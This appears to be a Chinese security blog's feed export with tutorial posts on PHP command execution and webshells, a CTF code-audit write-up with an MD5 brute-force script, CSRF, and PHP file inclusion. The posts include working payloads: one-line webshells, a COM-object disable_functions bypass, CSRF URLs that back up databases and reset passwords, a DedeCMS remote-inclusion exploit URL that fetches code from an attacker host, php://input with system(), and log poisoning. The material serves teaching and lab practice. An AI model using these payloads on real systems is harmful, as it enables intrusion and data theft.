<p>其中code_str是php代码字符串，通过构造传入eval函数中的全部或部分字符串的内容实现命令注入攻击。</p>
<p>示例代码：</p>
<pre><code>&lt;?php
$cmd = $_GET[&quot;cmd&quot;];
echo &quot;&lt;pre&gt;&quot;;
eval($cmd);
echo &quot;&lt;/pre&gt;&quot;;
?&gt;
</code></pre><p>如果传入的内容为<code>phpinfo();</code>,若传入的是一句话木马<code>&lt;?php eval($_POST[cmd]);?&gt;</code>就可以直接拿shell。</p>
<p>示例结果为：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/command_5.png" alt=""></p>
<h2 id="0x02-3-PHP-webshell命令执行防御及绕过方法"><a href="#0x02-3-PHP-webshell命令执行防御及绕过方法" class="headerlink" title="0x02.3 PHP webshell命令执行防御及绕过方法"></a>0x02.3 PHP webshell命令执行防御及绕过方法</h2><h3 id="0x02-3-1-PHP禁止webshell执行命令防御"><a href="#0x02-3-1-PHP禁止webshell执行命令防御" class="headerlink" title="0x02.3.1 PHP禁止webshell执行命令防御"></a>0x02.3.1 PHP禁止webshell执行命令防御</h3><p>PHP的配置文件php.ini里面有个disable_functions =<br>配置这个，禁止某些php函数，便可以禁止php的命令执行漏洞，例如：</p>
<blockquote>
<p>disable_functions=system,passthru,shell_exec,exec,popen</p>
</blockquote>
<h3 id="0x02-3-2-PHP-webshell命令执行绕过方法"><a href="#0x02-3-2-PHP-webshell命令执行绕过方法" class="headerlink" title="0x02.3.2 PHP webshell命令执行绕过方法"></a>0x02.3.2 PHP webshell命令执行绕过方法</h3><p>1.黑名单绕过</p>
<p>php能够执行系统命令的函数有：</p>
<blockquote>
<p>assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,`(反单引号)</p>
</blockquote>
<p>根据黑名单中没有的函数，即可绕过。</p>
<p>2.系统组件绕过</p>
<p>只适用于windows，代码如下：</p>
<pre><code>&lt;?php
$command = $_POST[a];
$wsh = new COM(&apos;WScript.shell&apos;);    //生成一个COM对象
$exec = $wsh-&gt;exec(&apos;cmd.exe /c &apos;.$command);    //调用对象方法来执行命令
$stdout = $exec-&gt;StdOut();
$stroutput = $stdout-&gt;ReadAll();
echo $stroutput
?&gt;
</code></pre><p>如何防御：直接删除system32下的wshom.ocx文件</p>
<p>2.拓展库绕过</p>
<h2 id="0x02-4-PHP-create-function-注入命令执行漏洞"><a href="#0x02-4-PHP-create-function-注入命令执行漏洞" class="headerlink" title="0x02.4 PHP create_function()注入命令执行漏洞"></a>0x02.4 PHP create_function()注入命令执行漏洞</h2><p>在PHP中使用create_function()创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给create_function()执行任意命令。</p>
]]></content>
      
        
        <tags>
            
            <tag> WAF绕过 </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一个简单的代码审计和MD5爆破脚本]]></title>
      <url>/2016/07/21/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%92%8CMD5%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC/</url>
      <content type="html"><![CDATA[<h1 id="0x01-php是最好的语言"><a href="#0x01-php是最好的语言" class="headerlink" title="0x01 php是最好的语言"></a>0x01 php是最好的语言</h1><p>代码审计。</p>
<p>描述：据说php是最好的语言，perfect？来试试看。地址：<code>http://218.76.35.75:20114/</code><br><a id="more"></a><br>源码如下：</p>
<pre><code>&lt;?php
show_source(__FILE__);
$v1=0;$v2=0;$v3=0;
$a=(array)json_decode(@$_GET[&apos;foo&apos;]);
if(is_array($a)){
    is_numeric(@$a[&quot;bar1&quot;])?die(&quot;nope&quot;):NULL;
    if(@$a[&quot;bar1&quot;]){
        ($a[&quot;bar1&quot;]&gt;2016)?$v1=1:NULL;
    }
    if(is_array(@$a[&quot;bar2&quot;])){
        if(count($a[&quot;bar2&quot;])!==5 OR !is_array($a[&quot;bar2&quot;][0])) die(&quot;nope&quot;);
        $pos = array_search(&quot;nudt&quot;, $a[&quot;a2&quot;]);
        $pos===false?die(&quot;nope&quot;):NULL;
        foreach($a[&quot;bar2&quot;] as $key=&gt;$val){
            $val===&quot;nudt&quot;?die(&quot;nope&quot;):NULL;
        }
        $v2=1;
    }
}
$c=@$_GET[&apos;cat&apos;];
$d=@$_GET[&apos;dog&apos;];
if(@$c[1]){
    if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d){
        eregi(&quot;3|1|c&quot;,$d.$c[0])?die(&quot;nope&quot;):NULL;
        strpos(($c[0].$d), &quot;htctf2016&quot;)?$v3=1:NULL;
    }
}
if($v1 &amp;&amp; $v2 &amp;&amp; $v3){
    include &quot;flag.php&quot;;
    echo $flag;
}
?&gt;
</code></pre><p><strong>tips：</strong>在本地搭建环境一个一个输出，看是什么情况</p>
<p>构造源码如下：</p>
<pre><code>&lt;?php
$v1=0;$v2=0;$v3=0;
//给3个变量赋值
$a=(array)json_decode(@$_GET[&apos;foo&apos;]);
//json_decode解码，所以要知道编码的样式
var_dump($a);
echo &apos;&lt;/br&gt;&apos;;
var_dump($_GET[&apos;foo&apos;]);
echo &apos;&lt;/br&gt;&apos;;
if(is_array($a)){
    //判断是不是数组
    echo ($a[&quot;bar1&quot;]);
    echo &apos;&lt;/br&gt;&apos;;
    echo is_numeric(@$a[&quot;bar1&quot;]);
    echo &apos;&lt;/br&gt;&apos;;
    is_numeric(@$a[&quot;bar1&quot;])?die(&quot;nope1&quot;):NULL;
    //判断是不是纯数字或数字字符串，如果是就die输出nope1
    if(@$a[&quot;bar1&quot;]){
        ($a[&quot;bar1&quot;]&gt;2016)?$v1=1:NULL;
        //php弱类型，其他类型和整形比较时，先把其他类型转化为整形
        echo $v1;
        echo &apos;&lt;/br&gt;&apos;;
    }
    if(is_array(@$a[&quot;bar2&quot;])){
        //判断是不是数组
        if(count($a[&quot;bar2&quot;])!==5 OR !is_array($a[&quot;bar2&quot;][0])) die(&quot;nope2&quot;);
        //or成立则die输出nope2，所以需要count($a[&quot;bar2&quot;])==5和is_array($a[&quot;bar2&quot;][0])有值
        echo &quot;good1&quot;;
        echo &apos;&lt;/br&gt;&apos;;
        $pos = array_search(&quot;nudt&quot;, $a[&quot;a2&quot;]);
        //有a2，并且值中有字符串“nudt”
        var_dump($pos);
        $pos===false?die(&quot;nope3&quot;):NULL;
        foreach($a[&quot;bar2&quot;] as $key=&gt;$val){
            $val===&quot;nudt&quot;?die(&quot;nope3&quot;):NULL;
            //bar2中不能有字符nudt
        }
        $v2=1;
        echo ($v2);
        echo &apos;&lt;/br&gt;&apos;;
    }
}
$c=@$_GET[&apos;cat&apos;];
$d=@$_GET[&apos;dog&apos;];
if(@$c[1]){
    if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d){
    //需要strcmp($c[1],$d)和$c[1]!==$d同时成立，即$c$d既相等又不相等
    //php弱类型，strcmp函数中数组和字符串比较返回null
        echo &quot;good2&quot;;
        eregi(&quot;3|1|c&quot;,$d.$c[0])?die(&quot;nope4&quot;):NULL;
        //eregi函数有个%00截断漏洞
        echo &quot;good3&quot;;
        var_dump(strpos(($c[0].$d), &quot;htctf2016&quot;));
        strpos(($c[0].$d), &quot;htctf2016&quot;)?$v3=1:NULL;
        $c[0]和$d连接返回字符串htctf2016的位置
        echo &quot;good4&quot;;
    }
    echo $v3;
}
if($v1 &amp;&amp; $v2 &amp;&amp; $v3){
    include &quot;flag.php&quot;;
    echo &quot;hello，Get It!&quot;;
    //echo &quot;flag{php_i5_n0t_b4d}&quot;;
}
?&gt;
</code></pre><p>最终的POC为：</p>
<blockquote>
<p><code>http://127.0.0.1:8080/hetian/test.php?foo={&quot;bar1&quot;:&quot;2017a&quot;,&quot;bar2&quot;:[[1],2,3,4,5],&quot;a2&quot;:&quot;nudt&quot;}&amp;cat[1][]=111&amp;cat[0]=aahtctf2016&amp;dog=%00</code></p>
</blockquote>
<p>效果为：<br><img src="http://oa8y5guqs.bkt.clouddn.com/hetian_1.png" alt=""></p>
<h1 id="0x02-忘记密码了"><a href="#0x02-忘记密码了" class="headerlink" title="0x02 忘记密码了"></a>0x02 忘记密码了</h1><p>描述：在这个网站，记录了小伙伴们的密码。 可是slash的密码怎么也找不到了，你能帮忙找出来么<br>地址：<code>http://218.76.35.75:20115</code></p>
<p>MD5爆破python脚本</p>
<p>打开其他的两个发现page是名字加三位数字的md5值。</p>
<p>脚本如下：</p>
<pre><code># -*- coding: utf8 -*-
import requests
import hashlib

url = &quot;http://218.76.35.75:20115/index.php?page=&quot;

for id in range(100,999):

    id=str(id)

    id=&apos;slash&apos;+id

    #print id

    payload = hashlib.md5(id).hexdigest()

    poc = url+payload

    #print poc

    conn = requests.get(poc)

    res = conn.content

    res = str(res)

    if res.find(r&quot;文件不存在，请返回&quot;)&gt;0 or res.find(r&quot;error!&quot;)&gt;0:

        print &quot;error!&quot;

    else:

        print poc

        print payload

        break
</code></pre><p>效果如下：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/hetian_2.png" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> 爆破 </tag>
            
            <tag> 编程 </tag>
            
            <tag> CTF </tag>
            
            <tag> Python </tag>
            
            <tag> PHP </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSRF漏洞总结]]></title>
      <url>/2016/07/20/CSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>CSRF（Cross-site request forgery跨站请求伪造，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，并且攻击方式几乎相左。XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。<br><a id="more"></a></p>
<h1 id="0x01-CSRF是什么？"><a href="#0x01-CSRF是什么？" class="headerlink" title="0x01 CSRF是什么？"></a>0x01 CSRF是什么？</h1><p>网站是通过cookie来识别用户的，当用户成功进行身份验证之后浏览器就会得到一个标识其身份的cookie，只要不关闭浏览器或者退出登录，以后访问这个网站会带上这个cookie。如果这期间浏览器被人控制着请求了这个网站的url，可能就会执行一些用户不想做的功能（比如修改个人资料）。因为这个不是用户真正想发出的请求，这就是所谓的请求伪造；呵呵，因为这些请求也是可以从第三方网站提交的，所以前缀跨站二字。</p>
<h1 id="0x02-CSRF可以做什么？"><a href="#0x02-CSRF可以做什么？" class="headerlink" title="0x02 CSRF可以做什么？"></a>0x02 CSRF可以做什么？</h1><p>你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。</p>
<h1 id="0x03-CSRF与XSS的区别"><a href="#0x03-CSRF与XSS的区别" class="headerlink" title="0x03 CSRF与XSS的区别"></a>0x03 CSRF与XSS的区别</h1><p>XSS：</p>
<pre><code>攻击者发现XSS漏洞——构造代码——发送给受害人——受害人打开——攻击者获取受害人的cookie——完成攻击
</code></pre><p>CSRF：</p>
<pre><code>攻击者发现CSRF漏洞——构造代码——发送给受害人——受害人打开——受害人执行代码——完成攻击
</code></pre><p>CSRF少了一个 获取受害人的cookie的步骤。为什么会少了呢。因为受害人在执行代码的时候就已经完成的攻击，而攻击者并没有参与进来。</p>
<hr>
<p>举个例子来说吧(受害者的网址是a.cn，攻击者的网址是b.cn)攻击者想要在某个网站(网站是某个开源CMS)添加上另一个管理员，但是这个网站并没有XSS漏洞。怎么办呢？这时攻击者发现了这个开源CMS后台添加管理员时并没有加入验证码或则token，只需要输入要添加的管理员账号和密码点击确定就可以添加管理员账户了。这时和我一样聪明的攻击者在自己的服务器上建立了一个html文件(假设地址是b.cn/index.html)。然后就给网站管理员发邮件等等，诱使管理员打开b.cn/index.html。当管理员打开后（这时管理员正在网站后台，或则管理员的session并没有失效的话），就可以神不知鬼不觉的在网站后台添加了一个管理员账户。</p>
<p><strong>CSRF的两个侧重点：</strong></p>
<pre><code>1.csrf的攻击建立在浏览器和web服务器的会话之中
2.欺骗用户访问恶意url
</code></pre><h1 id="0x04-CSRF实例"><a href="#0x04-CSRF实例" class="headerlink" title="0x04 CSRF实例"></a>0x04 CSRF实例</h1><h4 id="0x04-1-CSRF快速脱库"><a href="#0x04-1-CSRF快速脱库" class="headerlink" title="0x04_1 CSRF快速脱库"></a>0x04_1 CSRF快速脱库</h4><p>正常情况下，管理员备份数据库的方法是进入管理页面-管理中心-数据备份</p>
<p>我们现在用普通用户利用CSRF漏洞来备份网站的数据库。</p>
<h4 id="第一步：建个用户-普通权限"><a href="#第一步：建个用户-普通权限" class="headerlink" title="第一步：建个用户,普通权限"></a>第一步：建个用户,普通权限</h4><p><img src="http://oa8y5guqs.bkt.clouddn.com/csrf_1.png" alt=""></p>
<h4 id="第二步：构造备份数据库的链接"><a href="#第二步：构造备份数据库的链接" class="headerlink" title="第二步：构造备份数据库的链接"></a>第二步：构造备份数据库的链接</h4><blockquote>
<p><a href="http://127.0.0.1:8080/discuz1.5/upload/uc_server/admin.php?m=db&amp;a=operate&amp;t=export&amp;appid=0&amp;backupdir=xxxx%26backupfilename%3Daaaa" target="_blank" rel="external">http://127.0.0.1:8080/discuz1.5/upload/uc_server/admin.php?m=db&amp;a=operate&amp;t=export&amp;appid=0&amp;backupdir=xxxx%26backupfilename%3Daaaa</a></p>
</blockquote>
<p><strong>注：</strong>这个链接就是admin正常备份数据库的链接</p>
<h4 id="第三步：利用普通用户发一个帖子，帖子的信息能够达到诱骗管理员访问的目的，里面的图片写上我们备份数据库的链接，宽高都是0，这样就不会看到我们的恶意代码"><a href="#第三步：利用普通用户发一个帖子，帖子的信息能够达到诱骗管理员访问的目的，里面的图片写上我们备份数据库的链接，宽高都是0，这样就不会看到我们的恶意代码" class="headerlink" title="第三步：利用普通用户发一个帖子，帖子的信息能够达到诱骗管理员访问的目的，里面的图片写上我们备份数据库的链接，宽高都是0，这样就不会看到我们的恶意代码"></a>第三步：利用普通用户发一个帖子，帖子的信息能够达到诱骗管理员访问的目的，里面的图片写上我们备份数据库的链接，宽高都是0，这样就不会看到我们的恶意代码</h4><p><img src="http://oa8y5guqs.bkt.clouddn.com/csrf_2.png" alt=""></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/crrf_3.png" alt=""></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/csrf_4.png" alt=""></p>
<h4 id="第四步：引诱管理员访问帖子，这里我使用两个不同的浏览器，这样就不会因为cookie而产生歧义"><a href="#第四步：引诱管理员访问帖子，这里我使用两个不同的浏览器，这样就不会因为cookie而产生歧义" class="headerlink" title="第四步：引诱管理员访问帖子，这里我使用两个不同的浏览器，这样就不会因为cookie而产生歧义"></a>第四步：引诱管理员访问帖子，这里我使用两个不同的浏览器，这样就不会因为cookie而产生歧义</h4><p><img src="http://oa8y5guqs.bkt.clouddn.com/csrf_5.png" alt=""></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/csrf_6.png" alt=""></p>
<h4 id="第五步：访问我们自己构造的路径，即可得到数据库"><a href="#第五步：访问我们自己构造的路径，即可得到数据库" class="headerlink" title="第五步：访问我们自己构造的路径，即可得到数据库"></a>第五步：访问我们自己构造的路径，即可得到数据库</h4><blockquote>
<p><a href="http://127.0.0.1:8080/discuz1.5/upload/uc_server/data/backup/xxxx/aaaa-1.sql" target="_blank" rel="external">http://127.0.0.1:8080/discuz1.5/upload/uc_server/data/backup/xxxx/aaaa-1.sql</a></p>
</blockquote>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/csrf_7.png" alt=""></p>
<h3 id="0x04-2-CSRF修改密码"><a href="#0x04-2-CSRF修改密码" class="headerlink" title="0x04_2 CSRF修改密码"></a>0x04_2 CSRF修改密码</h3><p>比如某一套开源的CMS，知道改密码的链接，这样我们就可以把这些恶意代码，嵌入到某些页面，引诱管理员来访问，这样我们就改了管理员的密码。</p>
<p>这里用DVWA来演示实例。<br>这里默认账户密码为admin/password</p>
<h4 id="第一步：调安全级别为低，点击csrf"><a href="#第一步：调安全级别为低，点击csrf" class="headerlink" title="第一步：调安全级别为低，点击csrf"></a>第一步：调安全级别为低，点击csrf</h4><p><img src="http://oa8y5guqs.bkt.clouddn.com/csrf_11.png" alt=""></p>
<h4 id="第二步：构造恶意代码，嵌入到某一页面，引诱管理员访问"><a href="#第二步：构造恶意代码，嵌入到某一页面，引诱管理员访问" class="headerlink" title="第二步：构造恶意代码，嵌入到某一页面，引诱管理员访问"></a>第二步：构造恶意代码，嵌入到某一页面，引诱管理员访问</h4><blockquote>
<p><a href="http://127.0.0.1:8080/DVWA-1.9/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#" target="_blank" rel="external">http://127.0.0.1:8080/DVWA-1.9/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</a></p>
</blockquote>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/csrf_12.png" alt=""></p>
<h4 id="第三步：成功修改管理员密码-之前的密码无法登陆"><a href="#第三步：成功修改管理员密码-之前的密码无法登陆" class="headerlink" title="第三步：成功修改管理员密码,之前的密码无法登陆"></a>第三步：成功修改管理员密码,之前的密码无法登陆</h4><p><img src="http://oa8y5guqs.bkt.clouddn.com/csrf_13.png" alt=""></p>
<h1 id="0x05-CSRF防御"><a href="#0x05-CSRF防御" class="headerlink" title="0x05 CSRF防御"></a>0x05 CSRF防御</h1><h3 id="0x05-1-服务端的防御"><a href="#0x05-1-服务端的防御" class="headerlink" title="0x05_1 服务端的防御"></a>0x05_1 服务端的防御</h3><pre><code>1.验证HTTP Referer字段
2.请求地址中添加token并验证
3.在HTTP头中自定义属性并验证
4.在服务端严格区分好POST与GET的数据请求
5.使用验证码或者密码确认方式进行
</code></pre><h3 id="0x05-2-用户端的防御"><a href="#0x05-2-用户端的防御" class="headerlink" title="0x05_2 用户端的防御"></a>0x05_2 用户端的防御</h3><h3 id="0x05-3-安全设备的防御"><a href="#0x05-3-安全设备的防御" class="headerlink" title="0x05_3 安全设备的防御"></a>0x05_3 安全设备的防御</h3>]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> CSRF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[文件包含漏洞总结]]></title>
      <url>/2016/07/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>严格来说，文件包含漏洞是“代码注入”的一种，其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。“代码注入”的典型代表就是文件包含，文件包含漏洞可能出现在JSP、PHP、ASP等语言中，原理都是一样的，本文只介绍PHP文件包含漏洞。<br><a id="more"></a></p>
<h1 id="0x01-什么是文件包含漏洞？"><a href="#0x01-什么是文件包含漏洞？" class="headerlink" title="0x01 什么是文件包含漏洞？"></a>0x01 什么是文件包含漏洞？</h1><p>简单的来说，就是我们用一个可控的变量作为文件名并以文件包含的的方式调用了它，漏洞就产生了。以PHP为例文件包含漏洞可以分为RFI(远程文件包含)和LFI（本地文件包含漏洞）两种。而区分他们最简单的方法就是php.ini中是否开启了allow_url_include。如果开启了我们就有可能包含远程文件，如果不是我们有可能包含本地的文件。</p>
<h1 id="0x02-文件包含漏洞产生的原因？"><a href="#0x02-文件包含漏洞产生的原因？" class="headerlink" title="0x02 文件包含漏洞产生的原因？"></a>0x02 文件包含漏洞产生的原因？</h1><p>PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</p>
<h1 id="0x03-PHP包含漏洞分类"><a href="#0x03-PHP包含漏洞分类" class="headerlink" title="0x03 PHP包含漏洞分类"></a>0x03 PHP包含漏洞分类</h1><p>主要分为两类：</p>
<pre><code>1、本地文件包含LFI
2、远程文件包含RFI（需要php.ini中allow_url_include=on）
</code></pre><p>PHP中四个包含文件的函数：</p>
<blockquote>
<p>include(),include_once(),require()和require_once()</p>
</blockquote>
<p>它们的区别在于：</p>
<pre><code>include(),include\_once()在包含文件时，即使遇到错误，下面的代码依然会继续执行；
而require()和require_once()则会报错，直接退出程序。
</code></pre><h1 id="0x04-本地文件包含"><a href="#0x04-本地文件包含" class="headerlink" title="0x04 本地文件包含"></a>0x04 本地文件包含</h1><p>测试代码main.php：</p>
<pre><code>&lt;?php
echo &quot;Hello,this is file_include test!&quot;;
//初始化
define(&quot;ROOT&quot;,dirname(_File_).&apos;/&apos;);
//加载模块
$page = $_GET[&apos;page&apos;];
echo ROOT.$page.&apos;.php&apos;;
include(ROOT.$page.&apos;.php&apos;)
?&gt;
</code></pre><p>在同目录下创建1.php:</p>
<pre><code>&lt;?php phpinfo();?&gt;
</code></pre><p>请求/main.php?page=1</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_1.png" alt=""></p>
<h1 id="0x05-远程文件包含"><a href="#0x05-远程文件包含" class="headerlink" title="0x05 远程文件包含"></a>0x05 远程文件包含</h1><p>基于HTTP协议的测试代码</p>
<pre><code>&lt;?php
include($_GET[&apos;url&apos;]);
?&gt;
</code></pre><p>在远程主机放入一个2.txt，内容为</p>
<pre><code>&lt;?php phpinfo();?&gt;
</code></pre><p>在请求的url参数中传入2.txt的地址<code>http://oacotcyq8.bkt.clouddn.com/2.txt</code><br>返回本机的phpinfo信息。</p>
<p>远程文件包含还有一种利用PHP输入输出流的利用方式，可以直接执行POST代码，只要执行POST请求<code>main.php?url=php://input</code>,POST的内容为<code>&lt;?php phpinfo();?&gt;</code>,即可打印出phpinfo信息。</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_2.png" alt=""></p>
<h1 id="0x06-文件包含漏洞实例"><a href="#0x06-文件包含漏洞实例" class="headerlink" title="0x06 文件包含漏洞实例"></a>0x06 文件包含漏洞实例</h1><h3 id="0x06-1-本地文件包含实例"><a href="#0x06-1-本地文件包含实例" class="headerlink" title="0x06_1 本地文件包含实例"></a>0x06_1 本地文件包含实例</h3><p>1.首先有个正常的图片，里面包含一个phpinfo()函数。</p>
<p>2.打开DVWA上传含恶意代码的图片</p>
<p>3.利用文件包含访问链接：</p>
<blockquote>
<p><a href="http://127.0.0.1:8080/DVWA-1.9/vulnerabilities/fi/?page=../../hackable/uploads/1.jpg" target="_blank" rel="external">http://127.0.0.1:8080/DVWA-1.9/vulnerabilities/fi/?page=../../hackable/uploads/1.jpg</a></p>
</blockquote>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_3.png" alt=""><br><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_4.png" alt=""></p>
<h3 id="0x06-2-远程文件包含实例"><a href="#0x06-2-远程文件包含实例" class="headerlink" title="0x06_2 远程文件包含实例"></a>0x06_2 远程文件包含实例</h3><p>以Dedecms的一个远程文件包含漏洞为例</p>
<p>DedeCms &lt; 5.7-sp1远程文件包含漏洞，在了解这个漏洞之前，我们先了解一下Apache服务器解析文件流程。</p>
<p>当Apache检测到一个文件有多个扩展名时，比如1.php.bak,会从右向左判断，因为bak扩展名Apache不认识，所以就要向前解析，直到有一个Apache认识的扩展名，如果全部的扩展名都不认识，那么会按照httpd.conf配置中指定的方式进行展示，一般默认的是“text/plain”这种方式。我们了解完这个内容后再来分析下面这个漏洞。</p>
<p>这个问题出现在install/index.php.bak这个文件。看一下这个文件的代码：</p>
<pre><code>&lt;php?
…….
else if($step==11)
{
require_once(‘../data/admin/config_update.php’);
$rmurl = $updateHost.”dedecms/demodata.{$s_lang}.txt”;
echo $rmurl;
$sql_content = file_get_contents($rmurl);
$fp = fopen($install_demo_name,’w’);
if(fwrite($fp,$sql_content))
echo ‘  [√] 存在(您可以选择安装进行体验)’;
else
echo ‘  [×] 远程获取失败’;
unset($sql_content);
fclose($fp);
exit();
……
?&gt;
</code></pre><p>在上面的代码中我们看到在step=11中，首先包含了/data/admin/config_update.php这个文件，我们再打开这个文件，内容如下：</p>
<pre><code>&lt;?php
/**
 * 更新服务器，如果有变动，请到 http://bbs.dedecms.com 查询
 *
 * @version        $Id: config_update.php 1 11:36 2011-2-21 tianya $
 * @package        DedeCMS.Administrator
 * @copyright      Copyright (c) 2007 - 2010, DesDev, Inc.
 * @license        http://help.dedecms.com/usersguide/license.html
 * @link           http://www.dedecms.com
 */

//更新服务器，如果有变动，请到 http://bbs.dedecms.com 查询
$updateHost = &apos;http://updatenew.dedecms.com/base-v57/&apos;;
$linkHost = &apos;http://flink.dedecms.com/server_url.php&apos;;
</code></pre><p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_5.png" alt=""></p>
<p>指定了updateHost变量的值。看起来是没有办法包含的，因为变量是固定值，但是如果我们指定了install_demo_name是config_update.php这文件，并且内容是一个404的文件，情形是怎么样子的呢？</p>
<p>我们先来访问这个url:<br><code>http://127.0.0.1/ DedeCMS-5.7-UTF8-SP1/uploads/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/admin/config_update.php</code></p>
<p>这会让代码到</p>
<blockquote>
<p>http:// updatenew.dedecms.com/base-v57/dedecms/demodata.a.txt</p>
</blockquote>
<p>中取内容写入到</p>
<p><code>config_update.php，demodata.a.txt</code>。<br>你可能想要问了<br><code>http:// updatenew.dedecms.com/base-v57/dedecms/demodata.a.txt</code> 这个是什么呢？我们访问一下</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_6.png" alt=""></p>
<p>其实什么都没有，所以变量覆盖以后，我们打开config_update.php以后，里面已经什么都没有了</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_7.png" alt=""></p>
<p>这样updataHost变量的值便没有被初始化，那么我们想写什么就写什么了，这样就完成了一个远程文件包含漏洞的利用。构造一个url即可完成攻击：</p>
<pre><code>http://127.0.0.1/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/xxx.php&amp;updateHost=http://192.168.2.3/
</code></pre><h3 id="0x06-2-1-编写脚本测试"><a href="#0x06-2-1-编写脚本测试" class="headerlink" title="0x06_2.1 编写脚本测试"></a>0x06_2.1 编写脚本测试</h3><p>1.开始测试，打开dedecms，可以正常访问</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_10.png" alt=""></p>
<p>2.然后检测脚本是否可以正常运行</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_11.png" alt=""></p>
<p>3.脚本可以正常运行，然后我们测试漏洞是否可以利用成功，我们查看远程服务器的文件，如下图,我们在目录C:\wamp\www\dedecms\demodata.a.txt中写入需要我们写入web服务器中的内容，这样就可以写入xxx.php的文件中，从而达到getshell的目的。</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_12.png" alt=""></p>
<p>4.攻击者远程IP地址</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_13.png" alt=""></p>
<p>5.然后我们测试漏洞利用</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_14.png" alt=""></p>
<p>6.打开web服务器的data目录，可以看到，文件已经成功的写到了web服务器中。DedeCMS-5.7-UTF8-SP1\uploads</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_15.png" alt=""></p>
<p>7.我们访问一下</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_16.png" alt=""></p>
<p>8.漏洞利用成功</p>
<h1 id="0x06-文件包含漏洞利用技巧"><a href="#0x06-文件包含漏洞利用技巧" class="headerlink" title="0x06 文件包含漏洞利用技巧"></a>0x06 文件包含漏洞利用技巧</h1><p>远程文件包含漏洞之所以能够执行命令，就是因为攻击者可以自定义被包含的文件内容。因此，本地文件包含漏洞要想执行命令，也需要找一个攻击者能够控制内容的本地文件。</p>
<p>目前主要有几下几种常见的技巧：</p>
<h3 id="0x06-1-PHP包含读文件"><a href="#0x06-1-PHP包含读文件" class="headerlink" title="0x06_1 PHP包含读文件"></a>0x06_1 PHP包含读文件</h3><blockquote>
<p>php://filter/read=convert.base64-encode/resource=login.php</p>
</blockquote>
<h3 id="0x06-2-PHP包含写文件"><a href="#0x06-2-PHP包含写文件" class="headerlink" title="0x06_2 PHP包含写文件"></a>0x06_2 PHP包含写文件</h3><p>包含data://或php://input等伪协议。这需要目标服务器支持，同时要求allow_url_fopen为设置为ON。</p>
<pre><code>http://ip_address/?page=php://input
并且POST数据为&lt;?php system(&apos;net user&apos;);?&gt;
</code></pre><h3 id="0x06-3-包含日志文件"><a href="#0x06-3-包含日志文件" class="headerlink" title="0x06_3 包含日志文件"></a>0x06_3 包含日志文件</h3><p>当某个PHP文件存在文件包含漏洞，却无法上传文件时，这就意味着有包含漏洞却不能拿来利用，这时就可以利用apache日志文件来入侵</p>
<p>Apache服务器运行后会生成两个日志文件，access.log（访问日志）和error.log(错误日志)，apache会记录下我们的操作，并写入到访问日志access.log之中。</p>
<p>访问</p>
<blockquote>
<p><a href="http://ip_address/?page=../../../../Apache-20/logs/access.log" target="_blank" rel="external">http://ip_address/?page=../../../../Apache-20/logs/access.log</a></p>
</blockquote>
<h3 id="0x06-4-截断包含"><a href="#0x06-4-截断包含" class="headerlink" title="0x06_4 截断包含"></a>0x06_4 截断包含</h3><p>只适合于magic_quotes_gpc=off的时候。</p>
<blockquote>
<p>hhtp://ip_address/?page=1.jpg%00</p>
</blockquote>
